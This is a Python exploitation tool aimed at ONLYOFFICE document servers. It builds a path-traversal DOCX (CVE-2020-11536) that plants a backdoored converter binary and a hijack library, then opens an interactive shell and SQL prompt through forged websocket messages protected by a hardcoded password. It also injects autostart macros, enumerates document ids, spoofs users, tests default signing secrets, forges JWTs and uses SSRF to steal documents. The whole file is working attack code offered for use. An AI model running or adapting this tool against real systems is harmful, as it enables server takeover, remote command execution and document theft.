#!/usr/bin/python3
# Exploit ONLYOFFICE implementations

import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subprocess, websocket, base64, threading, hashlib, datetime, traceback, jwt, shutil, multiprocessing
import http.server
import socketserver
from urllib.parse import urlparse, parse_qs
from zipfile import ZipFile, ZipInfo

bdpassword = 'BcogExx7Hsmrti'

def process_fileparts( txt, docid=None ):
  txt = txt.replace(r'\"','"')[3:-2]
  m = re.search(r'([0-9]\+)\/Editor\.bin\/',txt)
  if m:
    print('DL:',m.group(1))
  data = json.loads(txt)
  print(data)
  tmpdir = tempfile.mkdtemp()
  for fn, url in data['data']['data'].items():
    dest = os.path.join( tmpdir, fn )
    d = os.path.dirname(dest)
    if not os.path.isdir(d):
      print('Creating ' + d)
      os.makedirs(d)
    print('Downloading ' + fn )
    r = requests.get( url, stream=True )
    print('Writing to '+dest,end='')
    with open( dest, 'wb' ) as f:
      for chunk in r:
        print('.',end='')
        f.write(chunk)
    print(' done')
  print( 'finished downloads')
  infile = os.path.join(tmpdir,'Editor.bin')
  if docid:
    outfile = str(docid)+'.docx'
  else:
    outfile = 'document.docx'
  # print('Attempting to convert ',infile,'to',outfile)
  # subprocess.check_output([os.path.dirname(os.path.realpath('__file__'))+'/bin/x2t',infile,outfile])
  # subprocess.check_output(['open',outfile])

# See if a signed URL is signed by a default secret
def test_secret_string( signedurl, secret='verysecretstring' ):
  h = get_url_signature( signedurl, secret )
  u = urlparse( signedurl )
  q = parse_qs( u.query )
  return q['md5'][0] == h

def md5( s ):
  m = hashlib.md5()
  m.update(s.encode('utf8'))
  h = base64.b64encode(m.digest()).decode('utf8').strip().replace('+','-').replace('/','_').replace('=','')
  return h

def get_url_signature( url, secret ):
  u = urlparse( url )
  q = parse_qs( u.query )
  s = q['expires'][0] + u.path.replace('/ds-vpath','') + secret
  return md5( s )

def sign_url( url, secret ):
  h = get_url_signature( url, secret )
  return url + '&md5=' + h

# Generate a docx dropper for a backdoored docservice bin
def generate_backdoor( serverroot, password, version, traversedepth ):
  
  print('Building CVE-2020-11536 payload for:')
  print(' - Server root:', serverroot)
  print(' - Password:', password)
  print(' - Version:', version)
  print(' - Traverse depth:', traversedepth)

  # Create build dir
  scriptdir = os.path.dirname(__file__)

  # Copy blank docx
  docsdir = scriptdir + '/docs'
  docfile = docsdir + '/backdoor.docx'
  shutil.copy( docsdir + '/blank.docx', docfile )

  # Open as zip
  zipObj = ZipFile( docfile,'a')
  root = '../' * traversedepth
  if serverroot.startswith('/'): serverroot = serverroot[1:]
    
  # zipObj.writestr( root + 'tmp/pwnlyoffice', 'Written by pwnlyoffice using CVE-2020-11536' )
  
  with open( scriptdir + '/src/proxy.sh', 'r' ) as f:
    txt = f.read().replace('{PASSWORD}','"'+password+'"')
    zipObj.writestr( root + serverroot + '/FileConverter/bin/x2t.sh', txt )
  
  with open( scriptdir + '/bin/hijack.so', 'rb' ) as f:
    zipObj.writestr( root + serverroot + '/FileConverter/bin/libpthread.so.0', f.read() )
  
  with open( scriptdir + '/bin/x2t', 'rb' ) as f:
    zipObj.writestr( root + serverroot + '/FileConverter/bin/x2t.old', f.read() )
  
  # zipObj.writestr( root + 'tmp/donlyoffice', 'Done' )
  
  zipObj.close()
  print('Done, backdoor dropper written to', docfile)
  sys.exit()
  return

class WsClient():

  autodownload=False
  testsecret=True
  output=False
  usejwt = False
  docurl = None
  callbacks = []
  backdoored = None

  def __init__( self, url, docid, platform, username='admin', output=False, disconnect=False, usejwt=False, jwtsecret='secret' ):
    self.usejwt = usejwt
    self.jwtsecret = jwtsecret
    self.output = output
    self.disconnect = disconnect
    self.docid = docid
    self.platform = platform
    self.url = url
    self.username = username
    self.license = None
    self.connect()

  def connect( self ):
    self.url = re.sub(r'^http(s)?','ws\g<1>',self.url)

    path = '/doc/'+self.docid+'/c/1/a/websocket'
  
    if self.platform == 'nextcloud':
      path = '/ds-vpath' + path
    
    if 'websocket' not in self.url: self.url = self.url + path

    if self.output: print( 'Connecting to', self.url )
    self.ws = websocket.create_connection( self.url )

    # Spawn socket listener
    self.spawn_listener()

  def close( self ):
    if self.output: print('Closing connection')
    self.send({'type':'close'})
    self.ws.close()
    self.stop_listener()

  def stop_listener( self ):
    if self.output: print('Stopping listener')
    self.listener.kill.set()

  def send( self, message ):
    if not self.ws.connected: return
    if type( message ) != str:
      # JSON containing JSON string
      if self.usejwt and message['type'] == 'auth': message['jwtOpen'] = self.create_jwt(message)
      strmessage = json.dumps([json.dumps(message)])
    self.ws.send( strmessage )

  def recv( self ):
    try:
      return self.ws.recv()
    except:
      return '' 
      

  def recv_listen( self ):
    while self.ws.connected:
      msg = self.recv()
      data = None
      if msg == '': 
        if self.output: print('Exiting listen loop')
        return
      if msg.startswith('a["{'):
        try:
          data = json.loads(json.loads(msg[1:])[0])
          if self.output: print("RECV:", data['type'] )
          if data['type'] == 'message':
            for m in data['messages']:
              if self.output: 
                print(datetime.datetime.utcfromtimestamp(round(m['time']/1000)).strftime('[%Y-%m-%d %H:%M:%S] ') + m['username'] + ': ' + m['message'])
          
          elif data['type'] == 'license':
            self.license = data['license']

          elif data['type'] == 'documentOpen':
            if self.output: print( data )
            if data["data"]["status"] == 'err':
              self.close()
              return
            if self.output: print('FOUND:',self.docid)
            if self.testsecret:
              if 'data' in data['data']:
                for secret in ['secret','SECRET','verysecretstring']:
                  if 'Editor.bin' in data['data']['data']:
                    s = test_secret_string( data['data']['data']['Editor.bin'], secret )
                  else:
                    s = test_secret_string( data['data']['data'], secret )
                  if self.output and s: print('Crypto secret is:', secret)
            if self.disconnect:
              self.close()
          
          elif data['type'] in ('auth','connectState'):
            if self.output:
              if 'participants' in data and len(data['participants']) > 0:
                print('\nParticipants:') 
                for p in data['participants']:
                  print(' - '+p['username'])

              if 'messages' in data and len(data['messages']) > 0:
                print('\nMessages:')
                for m in data['messages']:
                  print(datetime.datetime.utcfromtimestamp(round(m['time']/1000)).strftime('[%Y-%m-%d %H:%M:%S] ') + m['username'] + ': ' + m['message'])

          elif data['type'] == 'rpc':
            if self.output: print(data)
          else:
            if self.output: print('')
        except Exception as e:
          if self.output: 
            print("ERR:", e)
            print(traceback.format_exc())
      elif msg.startswith('c['):
        data = json.loads(msg[1:])
        print(data[1])
        if 'jwt must be provided' in data[1]:
          print('Call again with --usejwt (and --jwtsecret if you know it)')

      else:
        if self.output: print("RECV:", msg)
      if self.autodownload and 'origin.txt' in msg:
        url = data['data']['data']
        r = requests.get( url, stream=True )
        txt = r.content.decode('utf8')
        data['data']['txt'] = txt
        print('\n' + r.content.decode('utf8'))
      if self.autodownload and 'Editor.bin' in msg:
        process_fileparts(msg, self.docid)
        if self.disconnect:
          self.close()

      if data: self.exec_callbacks(data)

  def exec_callbacks( self, data ):
    for cb in self.callbacks:
      cb(data)

  def spawn_listener( self ):
    self.listener = threading.Thread( target=self.recv_listen )
    self.listener.kill = threading.Event()
    self.listener.start()

  def send_chat_message( self, msg ):
    data = {
      'type': 'message',
      'message': msg 
    }
    self.send( data )

  def get_messages( self ):
    self.send({"type":"getMessages"})

  def chat( self ):
    print('\nChat mode\n=========\nType messages, ENTER to send\n')
    self.output = True
    self.get_messages()
    while self.ws.connected:
      msg = input()
      self.send_chat_message(msg.strip())
    print('CHAT: Disconnected')

  def rename( self, name ):
    self.send(
    {
      "type":"rpc",
      "data": {
        'type': 'wopi_RenameFile',
        'name': name
      }
    })

  # Search for self.uniq in data['txt']
  def cb_set_backdoored( self, data ):
    if data['type'] != 'documentOpen': 
      return
    if 'txt' in data['data'] and self.uniq in data['data']['txt']:
      print('Backdoor enabled')
      self.backdoored = True
    else:
      # print('Server not backdoored, or wrong password')
      self.backdoored = False
  
  def test_is_backdoored( self, password ):
    print('test_is_backdoored')
    self.backdoored = None
    self.uniq = md5(str(time.time()))
    self.callbacks.append( self.cb_set_backdoored )
    self.send_backdoor_command( 'SHELL', password,  "echo \"" + base64.b64encode(self.uniq.encode('utf8')).decode('utf8') + "\" | base64 -d" )
    while self.backdoored is None:
      print('Wait')
      time.sleep(1)
    return self.backdoored

  def install_backdoor( self, password ):
    
    self.backdoored = None # Set backdoored state to unknown

    # Generate malicious doc
    print('Generating malicious docx')
    scriptdir = os.path.dirname(__file__)
    os.chdir(scriptdir)
    subprocess.call([os.path.realpath(__file__),'-u',self.url,'backdoor'])
    time.sleep(1)

    s = 'y' # input('Self-host malicious docx? (Y/n)').strip().lower()
    if s == 'n':
      print('Copy bin/backdoor.docx to your web host and enter the URL below')
    else:
      os.chdir(scriptdir + '/docs')
      Handler = http.server.SimpleHTTPRequestHandler
      PORT = 8000
      httpd = socketserver.TCPServer(("", PORT), Handler)
      print("serving at port", PORT)
      thread = threading.Thread(target=httpd.serve_forever)
      thread.daemon = True
      thread.kill = threading.Event()
      thread.start()
      defaulturl = 'http://172.17.0.1:8000/backdoor.docx'
    url = '' # input('URL ['+defaulturl+']: ').strip()
    if url == '':
      url = defaulturl

    # Request doc, write the malicious files
    print('Going to request doc from ' + url + '. You can edit this manually in the source or run with the real URL using the "dl" command.') 
    client = WsClient( 
      self.url, 
      md5(str(time.time())), 
      self.platform, 
      username=self.username, 
      usejwt=self.usejwt,
      jwtsecret=self.jwtsecret
    )
    client.docurl = url
    client.auth( )
    time.sleep(1)

    # Send an additional 2 commands:
    #  - First one executes libpthread.so if it hasn't already been executed, switching out x2t
    #  - Second one will run through x2t script, deleting libpthread.so 
    #  - Third one probably will work
    thread.kill.set()
    self.send_backdoor_command( 'SHELL', password, 'id')
    self.send_backdoor_command( 'SHELL', password, 'id')
    os.chdir(scriptdir)

  def backdoor( self, cmdtype, password ):
    self.test_is_backdoored( password )
    
    if not self.backdoored:
      self.install_backdoor( password )
      if not self.test_is_backdoored( password ):
        return

    while True:
      cmd = input(cmdtype + ' $ ')
      cmd = cmd.strip()
      if cmd == '': continue
      self.send_backdoor_command( cmdtype, password, cmd )

  def send_backdoor_command( self, cmdtype, password, cmd ):
    self.docid = md5(str(time.time()))
    self.connect()
    # Request with no URL, no save key, no forgotten, isbuilder True, 
    self.output = False
    data = {
      'type': 'auth',
      'docid': self.docid,
      'token': 'a',
      'user': {
        'id':'a',
        'username': self.username,
        'firstname':'',
        'lastname':'',
        'indexUser':-1
      },
      'editorType':0,
      'lastOtherSaveTime':-1,
      'block':[],
      'sessionId':None,
      'sessionTimeConnect':None,
      'sessionTimeIdle':0,
      'documentFormatSave':65,
      'view':False,
      'isCloseCoAuthoring':False,
      'openCmd':{ 
        'c':'open',
        'id':self.docid,
        'fileFrom': 'doc.html',
        'fileTo': 'doc.txt',
        'userid':self.username,
        'format':'txt',
        'url': 'http://localhost',
        'savekey': None,
        'forgotten': None,
        'title': cmdtype + ':' + password + ':' + cmd,
        'lcid':2057,
        'isbuilder':True,
        'nobase64':False,
        'withAuthorization': True,
        'externalChangeInfo': None,
        'wopiParams': None
      },
      'lang':None,
      'mode':None,
      'permissions':{'edit':True},
      'IsAnonymousUser':False
    }
    self.send( data )
    # self.receive_task( 'SHELL: ' + cmd )

  def create_jwt( self, data ):
    iat = int( time.time() )
    exp = iat + 1000
    body = {"document":{"key":self.docid,"permissions":data['permissions']},"editorConfig":{"user":{"id":"uid-1","name":self.username,"index":1},"ds_view":False,"ds_isCloseCoAuthoring":False,"ds_denyChangeName":True},"iat":time.time(),"exp":time.time() + 1000}
    jwtstr = jwt.encode( body, self.jwtsecret, algorithm='HS256' ).decode('utf8')
    return jwtstr

  def change_doc_info( self ):
    data = {
      'type': 'openDocument',
      'docid': self.docid,
      'token': 'a',
      'user': {
        'id':'a',
        'username': self.username,
        'firstname':'',
        'lastname':'',
        'indexUser':-1
      },
      'editorType':0,
      'lastOtherSaveTime':-1,
      'block':[],
      'sessionId':None,
      'sessionTimeConnect':None,
      'sessionTimeIdle':0,
      'documentFormatSave':65,
      'view':False,
      'isCloseCoAuthoring':False,
      'openCmd':{
        'c':'changedocinfo',
        'id':self.docid,
        'userid':'a',
        'format':'txt',
        'title':'SHELL: id',
        'lcid':2057,
        'nobase64':False,
        'isbuilder': True
      },
      'lang':None,
      'mode':None,
      'permissions':{'edit':True},
      'IsAnonymousUser':False
    }
    self.send( data )


  def auth( self, docurl='' ):
    if docurl: self.docurl = docurl
    data = {
      'type': 'auth',
      'docid': self.docid,
      'token': 'a',
      'user': {
        'id':'a',
        'username': self.username,
        'firstname':'',
        'lastname':'',
        'indexUser':-1
      },
      'editorType':0,
      'lastOtherSaveTime':-1,
      'block':[],
      'sessionId':None,
      'sessionTimeConnect':None,
      'sessionTimeIdle':0,
      'documentFormatSave':65,
      'view':False,
      'isCloseCoAuthoring':False,
      'openCmd':{
        'c':'open',
        'id':self.docid,
        'userid':'a',
        'format':'txt',
        'url': self.docurl,
        'title':'new doc',
        'lcid':2057,
        'isbuilder':True,
        'nobase64':False
      },
      'lang':None,
      'mode':None,
      'permissions':{'edit':True},
      'IsAnonymousUser':False
    }
    self.send( data )
    

  def save_changes( self, changes ):
    message = {
      'type':'saveChanges',
      'startSaveChanges':True,
      'endSaveChanges':True,
      'isCoAuthoring':False,
      'isExcel':False,
      'changes':json.dumps(changes),
      'deleteIndex': 1,
      'excelAdditionalInfo':json.dumps({
        'lm':'admin',
        'SYg':'admin',
        'wTg':'14;BgAAADgAMQA0AAAAAAA='
      }),
      'unlock':False,
      'releaseLocks':False
    }
    self.send( message )

  def inject_macro( self, macrotxt ):
    payload = json.dumps({
      "macrosArray":[{
        "name":"Macro 1",
        "value":macrotxt,
        "guid": str(uuid.uuid4()).replace('-',''),
        "autostart": True
      }],
      "current":0
    })
    data = b'\x1e\x00\x00\x00\x5f\x00\x6d\x00\x61\x00\x63\x00\x72\x00\x6f\x00\x73\x00\x47\x00\x6c\x00\x6f\x00\x62\x00\x61\x00\x6c\x00\x49\x00\x64\x00\x01\x00\x00\x00\x00\x00\x00\x00' +(2 * len(payload)).to_bytes(2,byteorder='little')+b'\x00\x00' + bytes(payload, 'utf16')[2:] + b'\x00\x00\x00\x00'
    changes = [str(len(data))+';'+base64.b64encode(data).decode('utf8')]
    self.save_changes( changes )


def main():
  parser = argparse.ArgumentParser(description="ONLYOFFICE exploitation tool")
  parser.add_argument('-u', '--url', help='Base URL of the site running ONLYOFFICE')
  parser.add_argument('-d', '--docid', help='id of the document')
  parser.add_argument('-U', '--username', default='admin', help='Username to spoof')
  parser.add_argument('-j', '--usejwt', default=False, action='store_true', help='Send a JWT with requests')
  parser.add_argument('--jwtsecret', help='Secret string to sign JWTs with', default='secret')
  parser.add_argument('-D', '--docurl', help='Document URL to download to OO cache for the current docid (SSRF, unix: pipes supported)', default='')
  parser.add_argument('-p', '--platform', default='nextcloud', help='What the underlying platform is')
  subparsers = parser.add_subparsers(dest='command')

  # Download
  dlparse = subparsers.add_parser('dl', help="Download a document")

  # Inject macro
  injparse = subparsers.add_parser('macro', help="Inject a JavaScript macro into a document")
  injparse.add_argument('script', help='Javascript file to inject into document')

  # Enumerate cached doc ids
  enumparse = subparsers.add_parser('enum', help="Attempt to enumerate valid document ids")
  enumparse.add_argument('docids', help='text file containing doc ids to test')

  # Chat
  chatparse = subparsers.add_parser('chat', help="Chat with other people connected to the same document")

  # Rename
  rnparse = subparsers.add_parser('rename', help="Invoke the rename function on the hosting DMS")
  rnparse.add_argument("filename",help='Filename to rename to')

  # Run shell command (backdoored DocServer only)
  shellparse = subparsers.add_parser('shell', help="Execute a shell command (requires document server to be backdoored)")
  shellparse.add_argument('--password',help='Password to allow backdoored doc server to exec shell commands. Change the default if you ever use this in a real engagement for goodness sake', default=bdpassword)
  # shellparse.add_argument('cmd', default='', help='Shell command to exec')
 
  # Run an SQL command
  shellparse = subparsers.add_parser('sql', help="Execute an SQL command (requires document server to be backdoored)")
  shellparse.add_argument('--password',help='Password to allow backdoored doc server to exec sql commands. Change the default if you ever use this in a real engagement for goodness sake', default=bdpassword)

  # Generate DOCX which drops a backdoored version of document server
  bdparse = subparsers.add_parser('backdoor', help='Generate a DOCX which drops a backdoored version of document server')
  bdparse.add_argument('--serverroot', help='Full path to docserver files', default='/var/www/onlyoffice/documentserver/server')
  bdparse.add_argument('--password',help='Password to protect backdoor from any old random from using it', default=bdpassword)
  bdparse.add_argument('--version',help='Which ONLYOFFICE version to build for')
  bdparse.add_argument('--depth', type=int, help='Depth of path traversal chars (../) required to reach root of filesystem', default=10)

  args = parser.parse_args()

  if not args.command or not args.url or ( args.command == 'enum' and not args.docids ):
    parser.print_help()
    sys.exit(2)

  # Document enumeration
  if args.command == 'enum':
    print('Attempting document id enumeration')
    threads = []
    start = time.time()
    with open( args.docids, 'r' ) as f:
      count = 1
      for line in f:
        clear = False
        docid = line.strip()
        while not clear:
          try:
            rate = round(count/(time.time() - start))
            print( count, docid, '  ', threading.active_count(), '  ', str(rate)+'/s', end='       \r' )
            client = WsClient( args.url, docid, args.platform, output=False, disconnect=True, usejwt=args.usejwt)
            client.auth()
            count+=1
            clear = True
            while threading.active_count() > 10: # Free license limits it to 20, warnings start filling up logs at 14.
              # print('Waiting for active threads to calm down:', threading.active_count(),end='               \r')
              time.sleep(0.1)
          except Exception as e:
            print( count )
            print( e )
            # print(traceback.format_exc())
    
    sys.exit(0)

  if not args.docid:
    args.docid = md5(str(time.time()))
    print('NO DOCID SPECIFIED - using "' + args.docid + '"')

  client = WsClient( 
    args.url, 
    args.docid, 
    args.platform, 
    username=args.username, 
    usejwt=args.usejwt,
    jwtsecret=args.jwtsecret
  )
  if args.docurl: client.docurl = args.docurl

  # Macro injection
  if args.command == 'macro':
    with open(args.script, 'r') as f:
      client.auth()
      time.sleep(1)
      print('Injecting',args.script)
      client.inject_macro(f.read())

  # Poison document cache with external URL
  # SSRF, steal documents
  if args.command == 'dl':
    client.autodownload = True
    client.disconnect = True
    client.output = True
    client.auth( )

  # Chat
  if args.command == 'chat':
    client.auth()
    client.chat()

  # Rename
  if args.command == 'rename':
    client.auth()
    client.rename( args.filename )

  # Provide a shell or SQL prompt 
  if args.command in ['shell','sql']:
    client.disconnect = True
    client.autodownload = True
    client.auth( args.docurl )
    client.backdoor( args.command.upper(), args.password )

  # Create a malicious document
  if args.command == 'backdoor':
    
    # Give license response a chance to come back
    while not client.license:
      print('Waiting for license info to come back...')
      time.sleep(1)
    if args.version:
      version = args.version
    else:
      version = client.license['buildVersion'] + '.' + str( client.license['buildNumber'] )
      client.close()
    generate_backdoor( args.serverroot, args.password, version, args.depth )

if __name__ == '__main__':
  main()
